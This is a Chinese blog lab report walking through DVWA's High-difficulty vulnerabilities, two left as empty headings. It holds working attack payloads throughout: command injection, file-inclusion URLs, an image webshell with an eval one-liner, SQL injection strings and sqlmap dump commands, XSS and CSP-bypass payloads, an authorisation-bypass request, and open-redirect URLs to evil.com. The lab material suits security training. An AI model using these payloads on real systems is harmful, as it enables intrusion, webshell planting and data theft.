---
cover: /images/DVWA.jpg
title: DVWA 靶场实验报告 (High Level)
categories:
  - DVWA
tags:
  - 靶场练习
  - DVWA
  - XSS
  - SQL注入
  - CSRF
abbrlink: f46202bc
date: 2026-03-09 12:00:00# DVWA 靶场实验报告 (High Level)

> **难度等级**：High
> **报告说明**：本文为 DVWA 靶场 High 难度下**17个漏洞**的详细渗透测试步骤，包含漏洞原理、利用方法、工具操作及核心Payload，全程基于Burp Suite、Sqlmap等工具实现，所有操作步骤均配套实操截图
https://www.cnblogs.com/wrold/p/19664521


## 📑 目录

1. [Brute Force --- 暴力破解](https://www.google.com/search?q=%231-brute-force)
2. [Command Injection --- 命令注入](https://www.google.com/search?q=%232-command-injection)
3. [CSRF --- 跨站请求伪造](https://www.google.com/search?q=%233-csrf)
4. [File Inclusion --- 文件包含](https://www.google.com/search?q=%234-file-inclusion)
5. [File Upload --- 文件上传](https://www.google.com/search?q=%235-file-upload)
6. [Insecure CAPTCHA --- 不安全的验证码](https://www.google.com/search?q=%236-captcha)
7. [SQL Injection --- SQL 注入](https://www.google.com/search?q=%237-sqli)
8. [SQL Injection (Blind) --- SQL 盲注](https://www.google.com/search?q=%238-sqli-blind)
9. [Weak Session IDs --- 弱会话 ID](https://www.google.com/search?q=%239-session)
10. [XSS (DOM) --- DOM 型跨站脚本](https://www.google.com/search?q=%2310-xss-dom)
11. [XSS (Reflected) --- 反射型跨站脚本](https://www.google.com/search?q=%2311-xss-reflected)
12. [XSS (Stored) --- 存储型跨站脚本](https://www.google.com/search?q=%2312-xss-stored)
13. [CSP Bypass --- CSP 策略绕过](https://www.google.com/search?q=%2313-csp)
14. [JavaScript Attacks --- JavaScript 攻击](https://www.google.com/search?q=%2314-js)
15. [Authorisation Bypass --- 越权访问](https://www.google.com/search?q=%2315-auth)
16. [Open HTTP Redirect --- 开放重定向](https://www.google.com/search?q=%2316-redirect)
17. [Cryptography --- 密码学](https://www.google.com/search?q=%2317-crypto)

---

## 


## 1. Brute Force — 暴力破解
### 漏洞特点
High 难度新增**时间延迟**+**user_token 验证**，token 明文显示在前端页面，需动态提取 token 配合爆破。
### 利用步骤
1. **抓包**：通过Burp Suite抓取登录请求包，可见`username`、`password`、`user_token`三个核心参数，token 为32位随机字符串。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303140843120.png)
2. **定位token**：查看前端页面源码，token 藏在`<input type="hidden" name="user_token" value="xxx">`中，可通过正则匹配提取。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171351342.png)
3. **Burp 配置**
   - 进入`Intruder`，选择**Pitchfork 交叉爆破**，标记`password`和`user_token`为爆破位置；
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171521377.png)
   - 进入`Settings`，开启**提取Grep项**，正则表达式配置为`value=(.*?)\/>\r\n`，匹配前端的token值；
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171551676.png)
   - 对`user_token`的Payload类型选择**递归提取**，并填入**初始请求的有效token**（抓包获取的原始token）。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171619770.png)
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171822505.png)
4. **爆破设置**：将资源池发包最大次数改为**1**（禁止并发，避免token失效），加载密码字典开始爆破。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171646350.png)
5. **结果分析**：按**响应长度排序**，长度与其他条目不同的即为正确密码（正确登录的响应页面与错误页面长度存在明显差异）。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171700267.png)

### 核心注意点
抓包后**禁止提前发包**，否则token会刷新导致爆破失败，需保证初始token与爆破请求一致。

---

## 2. Command Injection — 命令注入
### 漏洞特点
High 难度对管道符等命令分隔符做了黑名单过滤，但**过滤代码存在空格书写错误**，导致过滤失效，可构造无空格的命令拼接Payload。
### 漏洞代码分析
```php
if(isset($_POST['Submit'])){
    $target= trim($_REQUEST['ip']);
    $substitutions = array(
        // 过滤代码存在多余空格，导致过滤逻辑失效
    );
    $target=str_replace( array_keys( $substitutions ),$substitutions, $target );
    if(stristr(php_uname('s'),"Windows NT")){
        $cmd=shell_exec("ping ".$target);
    }else{
        $cmd=shell_exec("ping -c4 ".$target);
    }
    $html.="<pre>{$cmd}</pre>";
}
```

![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171906846.png)
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171947996.png)
### 利用方法
直接构造**无空格管道符拼接**的Payload，绕过滤黑名单位置：
```
127.0.0.1|whoami
```
提交后成功执行系统命令，返回当前用户信息。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172002703.png)

---

## 3. CSRF — 跨站请求伪造
### 漏洞特点
High 难度新增**user_token 验证**，token 明文显示在前端HTML源码中，单纯构造CSRF链接无法绕过，需**配合XSS漏洞提取token**后组合攻击。
### 漏洞分析
1. 抓包修改密码请求，可见URL中包含`password_new`、`password_conf`、`user_token`参数，token为必填项。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172205628.png)
2. 查看前端源码，`user_token`藏在隐藏输入框中，攻击者无法直接获取受害者的token，但可通过XSS注入脚本**自动提取受害者的token**并拼接CSRF请求。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172211542.png)
### 攻击思路
1. 利用靶场中存在的XSS漏洞（如反射型、存储型），构造XSS脚本提取页面中的`user_token`；
2. 将提取的token拼接至CSRF修改密码的URL中；
3. 诱导受害者点击包含XSS+CSRF的恶意链接，实现自动修改密码。

---

## 4. File Inclusion — 文件包含
### 漏洞特点
High 难度对`page`参数做了**关键词白名单过滤**（仅允许包含`file`/`fie`），但未限制伪协议，可通过**file://伪协议**实现任意文件读取。
### 漏洞代码分析
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172251076.png)
```php
$file=$_GET['page'];
if(!fnmatch("file,fie",$file)&&$file !="include.php"){
    echo "ERROR:File not found!";
    exit;
}
```
### 利用方法
构造`file://`伪协议Payload，指定本地文件绝对路径，实现任意目录文件读取：
```
http://dvwa:8564/vulnerabilities/fi/?page=file://D:/1.php
```
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172309457.png)

### 拓展利用
若服务器开启`php://`伪协议相关配置，可结合`php://filter`实现源码读取：
```
http://dvwa:8564/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php
```

---

## 5. File Upload — 文件上传
### 漏洞特点
High 难度做了**多重过滤**：文件类型校验、文件大小限制、`getimagesize()`图片头校验，无法直接上传webshell，需**制作图片马**配合**文件包含漏洞**实现webshell执行。
### 漏洞代码分析
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172608710.png)
```php
// 校验文件后缀、大小、是否为图片
if((strtolower($uploaded_ext) in $allowed_ext)&&($uploaded_size<100000)&&getimagesize($uploaded_tmp)){
    // 上传成功逻辑
}
```
### 利用步骤
1. **制作图片马**：任意正常图片（如11.png）后拼接PHP一句话webshell，**保留图片文件头**（避免`getimagesize()`校验失败）。
   ```
   // 图片马制作（cmd命令）
   copy 1.png /b + shell.php /a 11.png
   ```
   图片马内容示例：`<?php phpinfo();?>`（测试用）/`<?php @eval($_POST['pass']);?>`（一句话webshell）。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172643878.png)
2. **上传图片马**：直接上传制作好的11.png，靶场提示上传成功，返回文件路径`../hackable/uploads/11.png`。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172654847.png)
3. **文件包含利用**：通过File Inclusion漏洞的`file://`伪协议，包含上传的图片马，执行PHP代码：
   ```
   http://dvwa:8564/vulnerabilities/fi/?page=file:///D:/phpstudy_pro/WWW/DVWA-master/hackable/uploads/11.png
   ```
   访问后成功执行`phpinfo()`，证明图片马生效。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172702955.png)

### 核心注意点
图片马必须**保留合法图片头**，否则`getimagesize()`会检测出非图片文件，导致上传失败。

---

## 6. Insecure CAPTCHA — 不安全的验证码

---

## 7. SQL Injection — SQL 注入
### 漏洞特点
High 难度新增**会话弹窗验证**，但注入核心逻辑未变，仍为**字符型注入**，可通过手工注入或Sqlmap实现数据提取。
### 利用步骤（手工注入）
1. **判断注入类型**：
   - 输入`1`：正常返回数据；
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172912308.png)   
   - 输入`1'`：页面报错，说明为**字符型注入**，需用单引号闭合，注释符`#`截断语句。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172933124.png)
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172942705.png)
2. **验证注入点**：输入`1' and 1=1 #`，正常返回数据；输入`1' and 1=2 #`，无数据返回，注入点有效。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172947691.png)
3. **判断列数**：输入`1' order by 2 #`，正常返回；输入`1' order by 3 #`，报错，说明查询结果为**2列**。
4. **联合注入提取数据**：
   - 提取数据库名：`-1' union select 1,database() #`
   - 提取表名：`-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`
   - 提取字段名：`-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`
   - 提取账号密码：`-1' union select user,password from users #`
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173049751.png)
### 利用步骤（Sqlmap自动化注入）
由于注入结果在**第二个页面**展示，需使用`--second-url`参数指定结果页面，命令如下：
```bash
# 读取所有数据库
sqlmap -r D:\Backup\桌面\1.txt --dbs --batch --second-url=http://dvwa:8564/vulnerabilities/sqli/
# 读取users表数据
sqlmap -r D:\Backup\桌面\1.txt -D dvwa -T users -C user,password --dump --batch --second-url=http://dvwa:8564/vulnerabilities/sqli/
```
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173204950.png)
执行后成功提取数据库中所有账号和加密后的密码。

---

## 8. SQL Injection (Blind) — SQL 盲注
### 漏洞特点
High 难度在时间盲注中加入**随机sleep延迟**（`rand(0,5)==3`时触发2-4秒延迟），导致时间盲注失效，仅能使用**布尔盲注**实现数据提取。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173222105.png)
### 漏洞代码分析
```php
else {
    // 随机sleep，干扰时间盲注
    if(rand(0,5)==3){
        sleep(rand(2,4));
    }
}
```
### 利用步骤（Sqlmap自动化布尔盲注）
1. **抓包**：抓取盲注请求包，发现注入点位于**Cookie的id参数**中（`id=1`）。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173251073.png)
2. **指定布尔盲注**：使用`--technique=B`参数强制Sqlmap使用布尔盲注，结合`--second-url`指定结果页面，命令如下：
```bash
sqlmap -r D:\Backup\桌面\1.txt --dbs --batch --second-url="http://dvwa:8564/vulnerabilities/sqli_blind/" --technique=B
```
3. **结果提取**：Sqlmap通过布尔盲注的页面回显差异，成功爆破出所有数据库名（dvwa、security、pikachu等）。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173316329.png)

### 核心注意点
请求包中有多个参数时，**避免同时标记多个注入点**，逐个测试定位真实注入点（本次为Cookie的id参数）。

---

## 9. Weak Session IDs — 弱会话 ID
### 漏洞特点
High 难度的`dvwaSession`参数为**MD5加密的简单数字**，可通过MD5解密构造有效会话ID，导致会话劫持。
### 利用步骤
1. **查看Cookie**：在浏览器开发者工具中查看Cookie，可见`dvwaSession=b6d767d2f8ed5d21a44b0e5886680cb9`。
2. **MD5解密**：将`dvwaSession`的值进行MD5解密，结果为**22**（简单数字）。
3. **构造会话ID**：通过MD5加密连续数字（21、22、23、24...），生成大量有效`dvwaSession`值，尝试会话劫持。

### 漏洞危害
攻击者可通过构造弱会话ID，冒充其他用户登录系统，获取敏感信息。

---

## 10. XSS (DOM) — DOM 型跨站脚本
### 漏洞特点
High 难度对`default`参数做了**白名单过滤**（仅允许French、English、German、Spanish），非白名单值会被重定向，可通过**#号**绕过服务器过滤（服务器不解析#后参数，前端DOM解析）。
### 漏洞代码分析
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173417052.png)
```php
if(array_key_exists("default",$_GET)&&!is_nulL($_GET['default'])){
    switch($_GET['default']){
        case "French":case "English":case "German":case"Spanish":
            break;
        default:
            header("Location:?default=English");
            exit;
    }
}
```
### 利用方法
构造Payload，**白名单值+#号+XSS脚本**，服务器仅解析#前的English，前端DOM解析#后的XSS脚本：
```
http://dvwa:8564/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
```
访问后成功弹出弹窗，XSS利用成功。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173443287.png)

---

## 11. XSS (Reflected) — 反射型跨站脚本
### 漏洞特点
High 难度对`<script>`标签做了**严格的正则过滤**（匹配任意变种的script关键字，如ScRiPt、s<x>cript等），无法直接使用script标签，可通过**事件型XSS**绕过滤。
### 漏洞代码分析
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173453557.png)
```php
$name=preg_replace('/<(.*)s(.*)c(.*)(.)i(.*)p(.*)t/i',"",$_GET['name']);
$html.="<pre>hello{$name}</pre>";
```
### 利用方法
使用`<img>`标签的**onerror事件**构造无script的XSS Payload，触发弹窗：
```
<img src=x onerror=alert(1)>
```
提交后成功弹出弹窗，XSS利用成功。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173505508.png)

### 拓展Payload
```
<div onmouseover=alert(1)>鼠标悬停触发</div>
<a href=javascript:alert(1)>点击触发</a>
```

---

## 12. XSS (Stored) — 存储型跨站脚本
### 漏洞特点
High 难度对`message`字段做了**多重过滤**（`strip_tags`+`addslashes`+`htmlspecialchars`），完全无法注入；对`name`字段仅过滤`<script>`标签，可在`name`字段构造**事件型XSS**，并修改前端输入框限制实现长Payload输入。
### 漏洞代码分析
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173533479.png)
```php
// message字段严格过滤
$message=strip_tags(addslashes( $message));
$message=htmlspecialchars ( $message);
// name字段仅过滤script标签
$name=preg_replace('/<(.*)s(.*)c(.*)i(.*)p(.*)t/i',"",$name);
```
### 利用步骤
1. **修改前端输入限制**：`name`输入框默认有长度限制，通过浏览器开发者工具修改`maxlength`为**10000**，允许输入长Payload。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173548381.png)
2. **构造Payload**：在`name`字段输入`<img>`标签的onerror事件XSS Payload，`message`字段任意填写：
   ```
   <img src=x onerror=alert(1)>
   ```
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173556920.png)
3. **提交触发**：提交后留言簿中存储该Payload，任意用户访问留言簿页面时，自动弹出弹窗，存储型XSS利用成功。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173602044.png)

---

## 13. CSP Bypass — CSP 绕过
### 漏洞特点
High 难度配置了**内容安全策略（CSP）**，仅允许加载`self`（自身域名）的脚本，禁止外部脚本和未授权内联脚本，但靶场**自身代码存在逻辑漏洞**，可通过自身的JSONP接口绕过CSP。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173631677.png)
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173738131.png)
### 漏洞分析
1. 查看响应头，CSP配置为：`Content-Security-Policy: script-src 'self'`。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173616634.png)
2. 发现靶场存在**JSONP接口**：`/vulnerabilities/csp/source/jsonp.php?callback=xxx`，该接口可接收任意callback参数并执行，且属于自身域名，符合CSP规则。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173653009.png)
3. 后端存在**任意代码写入漏洞**，`include`参数可直接写入HTML/JS代码，无过滤。
### 利用方法
通过POST请求向`include`参数注入脚本，加载自身JSONP接口并执行XSS代码，Payload如下：
```
include=<script src="/vulnerabilities/csp/source/jsonp.php?callback=alert(1)"></script>
```
### 操作步骤
1. 打开Burp Suite的Repeater，构造POST请求，目标URL：`http://dvwa:8564/vulnerabilities/csp/`；
2. 请求体为`application/x-www-form-urlencoded`，参数：`include=<script src="/vulnerabilities/csp/source/jsonp.php?callback=alert(1)"></script>`；
3. 发送请求后，成功弹出弹窗，CSP绕过成功。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173751208.png)

---

## 14. JavaScript Attacks — JavaScript 攻击
### 漏洞特点
High 难度通过**JavaScript加密算法**生成`token`，需提交正确的`phrase`+`token`才能通过验证，核心为分析加密逻辑并还原`token`生成过程。
### 加密逻辑分析
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173801899.png)
通过Burp抓包获取混淆的JS代码，**反混淆**后得到3个核心加密函数，执行顺序为：`token_part_1` → `token_part_2`（300ms延时） → `token_part_3`（点击提交触发）。
#### 反混淆后核心JS代码
```javascript
// 字符串反转
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
// sha256(YY + token)，High难度为XX
function token_part_2(e = "XX") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
// sha256(token + ZZ)
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
// 反转phrase赋值给token
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
// 执行顺序：先token_part_1，300ms后token_part_2，点击提交触发token_part_3
document.getElementById("phrase").value = "";
setTimeout(function() {token_part_2("XX")}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173834572.png)
### 利用方法（两种）
#### 方法1：前端控制台手动执行加密函数
1. 在输入框中填入正确的`phrase`：`success`；
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173858457.png)
2. 打开浏览器开发者工具控制台，按顺序执行加密函数：
   ```javascript
   token_part_1("ABCD", 44);
   token_part_2("XX");
   ```
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173908224.png)
3. 点击**提交按钮**，触发`token_part_3`生成最终token，验证成功。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173918617.png)

#### 方法2：Python脚本还原加密过程，直接生成token
通过Python实现字符串反转+SHA256加密，直接生成最终token，构造POST请求提交。
##### Python加密脚本
```python
import hashlib

def do_something(e):
    """字符串反转"""
    return e[::-1]

def sha256(s):
    """SHA256 哈希计算"""
    return hashlib.sha256(s.encode()).hexdigest()

def calc_token(phrase="success"):
    # Step 1: token_part_1 - 反转phrase
    token = do_something(phrase)
    print(f"Step 1 (反转phrase): {token}")
    # Step 2: token_part_2 - sha256("XX" + token)
    token = sha256("XX" + token)
    print(f"Step 2 (sha256 XX+token): {token}")
    # Step 3: token_part_3 - sha256(token + "ZZ")
    token = sha256(token + "ZZ")
    print(f"Step 3 (sha256 token+ZZ): {token}")
    return token

if __name__ == "__main__":
    phrase = "success"
    token = calc_token(phrase)
    print(f"\n最终token: {token}")
    print(f"POST数据: phrase={phrase}&send=Submit&token={token}")
```
##### 执行脚本
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173945078.png)
运行后生成最终token，通过Burp构造POST请求提交，验证成功。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173956836.png)
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174004314.png)

---

## 15. Authorisation Bypass — 越权访问
### 漏洞特点
High 难度对前端页面做了**管理员权限校验**（非admin用户访问提示403），但对**后端接口文件`change_user_details.php`未做鉴权**，可直接发送JSON请求修改任意用户信息。
### 漏洞代码分析
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174017788.png)
```php
// 前端页面权限校验
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174017788.png)
if (dvwaCurrentUser() !="admin"){
    print "Unauthorised";
    http_response_code(403);
    exit;
}
// 后端接口change_user_details.php 无任何鉴权逻辑
```

### 利用方法
直接向`change_user_details.php`发送**JSON格式的POST请求**，修改任意用户的id、姓名等信息：
1. 目标URL：`http://dvwa:8564/vulnerabilities/authbypass/change_user_details.php`；
2. 请求头：`Content-Type: application/json`；
3. 请求体（JSON）：
   ```json
   {"id":3,"first_name":"hacked","surname":"hacked"}
   ```
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174058618.png)
4. 发送请求后，返回`{"result":"ok"}`，用户信息修改成功。
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174102999.png)

---

## 16. Open HTTP Redirect — 开放重定向
### 漏洞特点
High 难度对`redirect`参数做了**关键字匹配过滤**（仅允许包含`info.php`），但未限制`info.php`的位置，可构造包含`info.php`的恶意URL，实现任意地址重定向。
### 漏洞代码分析
```php
if (array_key_exists("redirect",$_GET) && $_GET['redirect']!=""){
    if(strpos($_GET['redirect'],"info.php")==false){
        http_response_code(500);
        echo "<p>You can only redirect to the info page.</p>";
        exit;
    }else{
        // 重定向逻辑
        header("Location: ".$_GET['redirect']);
    }
}
```
![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174119561.png)
### 利用方法
构造**包含info.php的恶意URL**，绕过滤后将受害者重定向到钓鱼网站/恶意站点，核心Payload示例：
```
# Payload1：参数后拼接info.php
?redirect=https://evil.com/?x=info.php
# Payload2：子域名中包含info.php
?redirect=https://evil.com/info.php.attacker.com/
# Payload3：锚点后拼接info.php
?redirect=https://attacker.com#info.php
```
### 漏洞危害
攻击者诱导受害者点击恶意链接，受害者在信任的dvwa域名下被重定向到恶意站点，导致钓鱼、账号窃取等攻击。

---

## 17. Cryptography — 密码学

---


